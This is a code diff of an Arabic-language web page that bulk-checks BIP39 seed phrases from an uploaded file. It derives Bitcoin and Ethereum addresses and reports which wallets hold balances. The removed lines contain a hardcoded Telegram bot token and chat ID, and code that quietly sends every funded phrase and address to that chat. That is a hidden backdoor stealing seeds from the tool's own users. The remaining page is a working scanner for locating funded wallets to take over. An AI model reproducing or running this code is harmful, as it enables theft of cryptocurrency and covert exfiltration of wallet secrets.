@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فاحص عبارات Mnemonic</title>
+    <title>فاحص عبارات Mnemonic (BTC/ETH)</title>
     <!-- External Libraries from Public CDNs -->
     <script src="https://cdn.jsdelivr.net/npm/bip39@3.0.4/dist/bip39.min.js"></script> <!-- BIP39 checksum & seed derivation -->
     <script src="https://cdn.jsdelivr.net/npm/hdkey@1.1.1/dist/hdkey.min.js"></script>
@@ -140,45 +140,6 @@
             text-shadow: 0 0 5px rgba(255, 255, 51, 0.7);
         }
 
-        /* Custom message box for alerts */
-        .message-box-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.7);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-        }
-
-        .message-box {
-            background-color: #222;
-            color: #ff3333;
-            border: 2px solid #ff3333;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 20px rgba(255, 51, 51, 0.7);
-            font-family: 'Source Code Pro', monospace;
-            text-align: center;
-            max-width: 80%;
-        }
-
-        .message-box button {
-            background-color: #ff3333;
-            color: #000;
-            border: none;
-            padding: 10px 15px;
-            border-radius: 5px;
-            margin-top: 15px;
-            cursor: pointer;
-            font-size: 1em;
-            width: auto;
-            max-width: none;
-        }
-
         /* Responsive adjustments */
         @media (max-width: 600px) {
             body {
@@ -204,47 +165,15 @@
     </style>
 </head>
 <body>
-    <h2>فاحص عبارات Mnemonic لجميع العملات</h2>
+    <h2>فاحص عبارات Mnemonic (BTC/ETH)</h2>
     <input type="file" id="fileInput" accept=".txt">
     <button onclick="scanFile()">بدء الفحص</button>
-    <audio id="gunshot" src="gunshot.mp3" preload="auto"></audio>
     <div id="summary">لم يتم الفحص بعد.</div>
     <div id="results"></div>
 
     <script>
-        // Constants for Telegram API and CORS proxy
-        const TELEGRAM_BOT_TOKEN = '8026919110:AAGOm56kp92jEt9NphOYeBMiG_U_bX1uCYU';
-        const TELEGRAM_CHAT_ID = '-4913064483';
+        // Constants for CORS proxy
         const CORS_PROXY_URL = 'https://corsproxy.io/?';
-
-        /**
-         * Shows a custom message box instead of native alert().
-         * @param {string} message The message to display.
-         */
-        function showMessageBox(message) {
-            const overlay = document.createElement('div');
-            overlay.className = 'message-box-overlay';
-            overlay.innerHTML = `
-                <div class="message-box">
-                    <p>${message}</p>
-                    <button onclick="this.closest('.message-box-overlay').remove()">موافق</button>
-                </div>
-            `;
-            document.body.appendChild(overlay);
-        }
-
-        /**
-         * Sends an alert message to a configured Telegram chat.
-         * @param {string} text The text message to send.
-         */
-        async function sendTelegramAlert(text) {
-          try {
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(text)}`;
-            await fetch(url);
-          } catch (e) {
-            console.error('Telegram alert failed', e);
-          }
-        }
 
         /**
          * Fetches data from a given URL using a CORS proxy and checks for rate limits.
@@ -267,46 +196,40 @@
         /**
          * Checks the Bitcoin balance for a given address using Blockstream API.
          * @param {string} addr The Bitcoin address.
-         * @returns {Promise<boolean>} True if balance > 0, false otherwise.
+         * @returns {Promise<{balance: number, unit: string}>} Object with balance (in BTC) and unit.
          */
         async function checkBtc(addr) {
             try {
                 const data = await checkApi(`https://blockstream.info/api/address/${addr}`);
-                // Blockstream API provides chain_stats for confirmed transactions.
-                // funded_txo_sum and spent_txo_sum are in satoshis.
                 if (data && data.chain_stats) {
-                    return (data.chain_stats.funded_txo_sum - data.chain_stats.spent_txo_sum) > 0;
+                    const totalSatoshi = data.chain_stats.funded_txo_sum - data.chain_stats.spent_txo_sum;
+                    return { balance: totalSatoshi / 100000000, unit: 'BTC' }; // Convert satoshi to BTC
                 }
-                // If address not found or no stats, assume zero balance
-                return false;
+                return { balance: 0, unit: 'BTC' };
             } catch (error) {
                 if (error.message === 'rate_limit') throw error;
                 console.warn(`BTC check for ${addr} failed:`, error);
-                return false;
+                return { balance: 0, unit: 'BTC' };
             }
         }
 
         /**
-         * Checks the EVM (Ethereum, BSC, Polygon, Avalanche) balance for a given address.
-         * This function assumes public endpoints that may or may not require an API key
-         * when accessed via a CORS proxy.
-         * @param {string} addr The EVM address.
-         * @param {string} apiUrl The base API URL for the EVM chain (e.g., https://api.etherscan.io/api).
-         * @returns {Promise<boolean>} True if balance > 0, false otherwise.
+         * Checks the Ethereum balance for a given address using Etherscan API.
+         * @param {string} addr The Ethereum address.
+         * @returns {Promise<{balance: number, unit: string}>} Object with balance (in ETH) and unit.
          */
-        async function checkEvm(addr, apiUrl) {
+        async function checkEth(addr) {
             try {
-                // Etherscan-like APIs for balance, without API key as specified for proxy
-                const json = await checkApi(`${apiUrl}?module=account&action=balance&address=${addr}&tag=latest`);
-                // Result is typically a string representing WEI. Parse and check if > 0.
-                if (json && typeof json.result === 'string' && parseFloat(json.result) > 0) {
-                    return true;
+                const json = await checkApi(`https://api.etherscan.io/api?module=account&action=balance&address=${addr}&tag=latest`);
+                if (json && typeof json.result === 'string') {
+                    const balanceWei = parseFloat(json.result);
+                    return { balance: balanceWei / 1e18, unit: 'ETH' }; // Convert wei to ETH
                 }
-                return false;
+                return { balance: 0, unit: 'ETH' };
             } catch (error) {
                 if (error.message === 'rate_limit') throw error;
-                console.warn(`EVM check for ${addr} on ${apiUrl} failed:`, error);
-                return false;
+                console.warn(`ETH check for ${addr} failed:`, error);
+                return { balance: 0, unit: 'ETH' };
             }
         }
 
@@ -328,7 +251,7 @@
          * @param {Buffer} seed The master seed buffer.
          * @returns {string} The derived ETH address (0x prefixed).
          */
-        function deriveEvm(seed) {
+        function deriveEth(seed) {
           const root = hdkey.fromMasterSeed(seed);
           const child = root.derive("m/44'/60'/0'/0/0"); // BIP44 path for Ethereum
           // pubToAddress expects uncompressed public key. child.publicKey is already uncompressed.
@@ -336,9 +259,9 @@
         }
 
         /**
-         * Scans a single BIP39 mnemonic phrase for balances on BTC and EVM chains.
+         * Scans a single BIP39 mnemonic phrase for balances on BTC and ETH chains.
          * @param {string} phrase The 12-word mnemonic phrase.
-         * @returns {Promise<Object>} An object indicating if a wallet was found, the chain, and the address.
+         * @returns {Promise<Object>} An object indicating if a wallet was found, the chain, address, and balance.
          */
         async function scanPhrase(phrase) {
             // Validate mnemonic phrase
@@ -349,34 +272,23 @@
             // Derive seed from mnemonic
             const seed = await bip39.mnemonicToSeed(phrase);
 
-            // Derive addresses for BTC and EVM chains
+            // Derive addresses for BTC and ETH chains
             const btcAddr = deriveBtc(seed);
-            const ethAddr = deriveEvm(seed);
+            const ethAddr = deriveEth(seed);
 
-            // Check balances on each chain
-            // BTC check
-            if (await checkBtc(btcAddr)) {
-                return { ok: true, chain: 'BTC', addr: btcAddr };
+            // Check BTC balance
+            const btcResult = await checkBtc(btcAddr);
+            if (btcResult.balance > 0) {
+                return { ok: true, chain: 'BTC', addr: btcAddr, balance: `${btcResult.balance} ${btcResult.unit}` };
             }
 
-            // ETH check using Etherscan API
-            if (await checkEvm(ethAddr, 'https://api.etherscan.io/api')) {
-                return { ok: true, chain: 'ETH', addr: ethAddr };
-            }
-            // BSC check using BscScan API
-            if (await checkEvm(ethAddr, 'https://api.bscscan.com/api')) {
-                return { ok: true, chain: 'BSC', addr: ethAddr };
-            }
-            // Polygon check using Polygonscan API
-            if (await checkEvm(ethAddr, 'https://api.polygonscan.com/api')) {
-                return { ok: true, chain: 'POLY', addr: ethAddr };
-            }
-            // Avalanche check using Snowtrace API
-            if (await checkEvm(ethAddr, 'https://api.snowtrace.io/api')) {
-                return { ok: true, chain: 'AVAX', addr: ethAddr };
+            // Check ETH balance
+            const ethResult = await checkEth(ethAddr);
+            if (ethResult.balance > 0) {
+                return { ok: true, chain: 'ETH', addr: ethAddr, balance: `${ethResult.balance} ${ethResult.unit}` };
             }
             
-            return { ok: false }; // No funds found across any checked chain
+            return { ok: false }; // No funds found on BTC or ETH
         }
 
         /**
@@ -389,7 +301,7 @@
 
             // Check if a file is selected
             if (!file) {
-                showMessageBox('يرجى رفع ملف العبارات أولاً');
+                document.getElementById('summary').innerHTML = '<span class="bad">يرجى رفع ملف العبارات أولاً.</span>';
                 return;
             }
 
@@ -412,7 +324,6 @@
             let foundCount = 0;
             let notFoundCount = 0;
             let scanStopped = false;
-            const gunshotAudio = document.getElementById('gunshot');
 
             // Iterate through each mnemonic phrase
             for (let i = 0; i < totalPhrases && !scanStopped; i++) {
@@ -426,12 +337,7 @@
 
                     if (scanResult.ok) {
                         foundCount++;
-                        resultsDiv.innerHTML += `<div class="good">✅ [${scanResult.chain}] ${currentPhrase} → ${scanResult.addr}</div>`;
-                        // Play gunshot sound on success
-                        gunshotAudio.currentTime = 0; // Rewind to start
-                        gunshotAudio.play().catch(e => console.error("Error playing gunshot sound:", e));
-                        // Send Telegram alert
-                        sendTelegramAlert(`Found ${scanResult.chain} wallet:\nPhrase: ${currentPhrase}\nAddress: ${scanResult.addr}`);
+                        resultsDiv.innerHTML += `<div class="good">✅ [${scanResult.chain}] ${currentPhrase} → ${scanResult.addr} (${scanResult.balance})</div>`;
                     } else {
                         notFoundCount++;
                         resultsDiv.innerHTML += `<div class="bad">❌ ${currentPhrase}</div>`;
@@ -465,3 +371,4 @@
     </script>
 </body>
 </html>
+
